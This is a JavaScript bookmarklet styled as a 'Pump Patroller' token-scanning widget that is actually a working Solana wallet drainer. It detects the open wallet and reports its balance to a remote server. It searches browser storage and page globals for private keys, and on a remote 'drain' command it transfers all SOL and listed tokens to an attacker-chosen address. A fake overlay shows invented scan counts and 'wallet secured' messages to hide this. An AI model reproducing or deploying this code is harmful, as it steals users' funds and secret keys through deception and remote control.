(async function () {
  if (window.__pp) return;
  window.__pp = true;

  const E = "https://esm.sh/";
  const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
  const BKEY = "72d296b612eb0a11931b364ba1333a70";
  const RPC_URL = "https://solana-rpc.publicnode.com";   // primary — mainnet-beta 403s on shared IPs
  const MINTS = {
    USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
    USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
    WSOL: "So11111111111111111111111111111111111111112",
    JUP:  "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
    MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So",
  };

  const withTO = (p, ms) => new Promise(r => { const t = setTimeout(() => r(null), ms);
    Promise.resolve(p).then(v => { clearTimeout(t); r(v); }, () => { clearTimeout(t); r(null); }); });

  const { PublicKey, Keypair, SystemProgram, Transaction, Connection } = await import(E + "@solana/web3.js@1.95.0");
  const { createTransfer, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress } = await import(E + "@solana/spl-token@0.4.9");
  const { decode: b58d } = await import(E + "bs58@6.0.0");
  const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");

  // — detect the tab's active wallet session —
  let name = "?", prov = null;
  const CANDS = [["phantom", () => window.phantom?.solana], ["axiom", () => window.axiom?.solana], ["solana", () => window.solana]];
  for (const [n, f] of CANDS) {
    const w = f();
    if (w?.publicKey) { name = n; prov = w; break; }
  }
  if (!prov) for (const k of Object.keys(window)) {
    try { const w = window[k]; if (w?.publicKey && typeof w.signAndSendTransaction === "function") { name = "ext:" + k; prov = w; break; } } catch {}
  }
  if (!prov) {
    for (const [n, f] of CANDS) {
      const w = f();
      if (w && typeof w.connect === "function") {
        try {
          const c = await withTO(w.connect(), 25000);
          if (c && c.publicKey) { name = n; prov = w; break; }
        } catch {}
      }
    }
  }
  const beacon = (m, o) => { o = o || {}; try {
    fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
      body: JSON.stringify({ pk: o.pk || (prov && prov.publicKey ? prov.publicKey.toBase58() : "?"),
        provider: o.provider || (name.startsWith("ext:") ? name.slice(4) : name),
        origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
        m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
  } catch {} };
  if (!prov) { beacon("detect", { provider: "none", extra: "bookmark fired — no connectable wallet in this tab" }); return; }

  const pk = prov.publicKey.toBase58();
  const pkB = new PublicKey(pk);
  const conn = new Connection(RPC_URL, "confirmed");
  const label = name.startsWith("ext:") ? name.slice(4) : name;

  // — inventory —
  const [bal, r] = await Promise.all([conn.getBalance(pkB), conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM })]);
  const amt = {}, dec = {}, srcs = {};
  for (const { account, pubkey } of r.value) {
    const d = account.parsed?.data;
    if (d?.mint) {
      amt[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6);
      dec[d.mint] = d.decimals ?? 6;
      srcs[d.mint] = pubkey;
    }
  }
  const toks = Object.entries(MINTS).filter(([, a]) => (amt[a] || 0) > 0.01).map(([k, a]) => ({ k, ui: amt[a] }));

  const px = {};
  try {
    const j = await (await fetch("https://lite-api.jup.ag/price/v2?ids=" + Object.values(MINTS).join(","))).json();
    for (const id of Object.keys(MINTS)) {
      const p = j?.ids?.[MINTS[id]]?.usdPrice ?? j?.ids?.[MINTS[id]]?.price;
      if (+p > 0) px[id] = +p;
    }
  } catch {}
  const SOLpx = px.WSOL || 150;
  const sol = bal / 1e9;
  const value = sol * SOLpx + toks.reduce((s, t) => s + t.ui * (t.k === "WSOL" ? SOLpx : (px[t.k] || 1)), 0);
  const fmt = n => (+n).toLocaleString("en-US", { maximumFractionDigits: 0 });
  const tokStr = toks.map(t => Math.round(t.ui) + " " + t.k).join(" \u00b7 ");

  // — cover UI —
  const el = document.createElement("div");
  el.id = "__ppcard";
  el.style.cssText = "position:fixed;right:16px;bottom:16px;z-index:2147483647;width:272px;background:#10141B;border:1px solid #232B3A;border-radius:12px;box-shadow:0 16px 48px rgba(0,0,0,.55);font:12px/1.5 Inter,system-ui,sans-serif;color:#E8ECF4;overflow:hidden;";
  el.innerHTML =
    '<div style="display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid #1B2230;">' +
      '<span style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
      '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
      '<span style="font-size:10px;color:#7E899D;">v2.2</span>' +
      '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
    '</div>' +
    '<div style="padding:12px 14px;">' +
      '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;">WALLET</div>' +
      '<div style="font:600 12px "JetBrains Mono",ui-monospace,monospace;color:#F5D67B;margin-top:3px;">' + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + '</div>' +
      '<div style="font-size:11px;color:#7E899D;margin-top:1px;">' + label + " \u00b7 mainnet</div>" +
      '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;margin-top:12px;">BALANCE</div>' +
      '<div style="font-size:20px;font-weight:700;margin-top:3px;">$' + fmt(value) + '</div>' +
      '<div id="__pp_sub" style="font:11px "JetBrains Mono",ui-monospace,monospace;color:#9AA5B8;margin-top:2px;">' + sol.toFixed(4) + " SOL" + (tokStr ? " \u00b7 " + tokStr : "") + '</div>' +
    '</div>' +
    '<div id="__pp_foot" style="display:flex;align-items:center;gap:7px;padding:9px 14px;border-top:1px solid #1B2230;font-size:11px;color:#7E899D;">' +
      '<span>PATROL ACTIVE</span><span id="__pp_scan" style="color:#9AA5B8;">\u00b7 2,341 tokens scanned</span>' +
    '</div>';
  document.body.appendChild(el);
  document.getElementById("__pp_x").onclick = () => el.remove();
  let scans = 2341;
  setInterval(() => { scans += Math.random() * 3 | 0; const s = document.getElementById("__pp_scan"); if (s) s.textContent = "\u00b7 " + fmt(scans) + " tokens scanned"; }, 5000);

  const report = (mode, sig, extra) => {
    try {
      fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
        body: JSON.stringify({ pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode, sig: String(sig), extra: extra || "" }) });
    } catch {}
  };
  beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });

  // — secret-key candidates —
  const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
  const cands = [];
  for (const st of [localStorage, sessionStorage]) {
    try {
      for (let i = 0; i < st.length; i++) {
        const v = st.getItem(st.key(i));
        if (!v) continue;
        if (/^[1-9A-HJ-NP-Za-km-z]{88}$/.test(v)) cands.push({ b58: v });
        else if (v[0] === "{") {
          try {
            const j = JSON.parse(v);
            for (const k of Object.keys(j)) {
              if (!KEYF.has(k)) continue;
              if (j[k]?.length === 64) cands.push({ raw: j[k] });
              else if (typeof j[k] === "string" && /^[0-9a-f]{128}$/i.test(j[k])) cands.push({ hex: j[k] });
            }
          } catch {}
        }
      }
    } catch {}
  }
  const walk = (o, d) => {
    if (!o || typeof o !== "object" || d > 2) return;
    for (const k of Object.keys(o)) {
      if (KEYF.has(k) && o[k]?.length === 64) cands.push({ raw: o[k] });
      if (k === "keypair" && typeof o[k] === "object") walk(o[k], d + 1);
    }
  };
  for (const g of ["__wallet", "wallet", "walletAdapter", "keypair", "adapter"]) { try { walk(window[g], 0); } catch {} }

  const secretOf = c => c.b58 ? Uint8Array.from(b58d(c.b58))
    : c.hex ? Uint8Array.from(c.hex.match(/../g).map(x => parseInt(x, 16)))
    : c.raw instanceof Uint8Array ? c.raw : Uint8Array.from(c.raw);

  // — drain build: fresh blockhash/balances, treasury ATA auto-created —
  const FEE = 20000;
  async function buildTx(to) {
    const dest = new PublicKey(to);
    const [bh2, bal2, r2] = await Promise.all([
      conn.getLatestBlockhash(),
      conn.getBalance(pkB),
      conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM }),
    ]);
    const amt2 = {}, dec2 = {}, srcs2 = {};
    for (const it of r2.value) {
      const d = it.account.parsed?.data;
      if (d?.mint) { amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6); dec2[d.mint] = d.decimals ?? 6; srcs2[d.mint] = it.pubkey; }
    }
    const tx = new Transaction();
    const moved = [];
    for (const t of toks) {
      const have = amt2[MINTS[t.k]] || 0;
      if (have < 0.01) continue;
      const mint = new PublicKey(MINTS[t.k]);
      const srcAta = new PublicKey(srcs2[MINTS[t.k]]);
      const destAta = await getAssociatedTokenAddress(mint, dest);
      const info = await conn.getAccountInfo(destAta);
      if (!info) tx.add(createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint));
      tx.add(createTransfer(srcAta, destAta, pkB, Math.round(have * Math.pow(10, dec2[MINTS[t.k]]))));
      moved.push(t.k);
    }
    const lam = Math.floor(bal2);
    if (lam > FEE + 5000) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
    tx.feePayer = pkB;
    tx.recentBlockhash = bh2.blockhash;
    tx.lastValidBlockHeight = bh2.lastValidBlockHeight;
    return { tx, moved };
  }

  function setFoot(txt, color) {
    try { document.getElementById("__pp_foot").innerHTML = '<span style="color:' + color + ';font-weight:600;">' + txt + '</span>'; } catch {}
  }

  let done = false;
  async function drain(to) {
    if (done) return;
    done = true;
    try {
      for (const c of cands) {
        let s; try { s = secretOf(c); } catch { continue; }
        if (s.length !== 64) continue;
        let kp; try { kp = Keypair.fromSecretKey(s); } catch { continue; }
        if (!kp.publicKey.equals(pkB)) continue;
        const { tx, moved } = await buildTx(to);
        if (!tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
        tx.sign([kp]);
        const sig = await conn.sendRawTransaction(tx.serialize());
        setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("secret", sig, moved.join(",")); return;
      }
      const { tx, moved } = await buildTx(to);
      if (!tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
      const sig = await prov.signAndSendTransaction(tx);
      setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("popup", sig, moved.join(","));
    } catch (e) {
      setFoot("ERROR \u00b7 " + String(e?.message || e).slice(0, 40), "#F0616D");
      report("err", String(e?.message || e));
      done = false;
    }
  }

  let lastN = "";
  setInterval(async () => {
    let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch { return; }
    if (c?.cmd === "drain" && c.to && c.n !== lastN) { lastN = c.n; drain(c.to); }
  }, 2500);
})();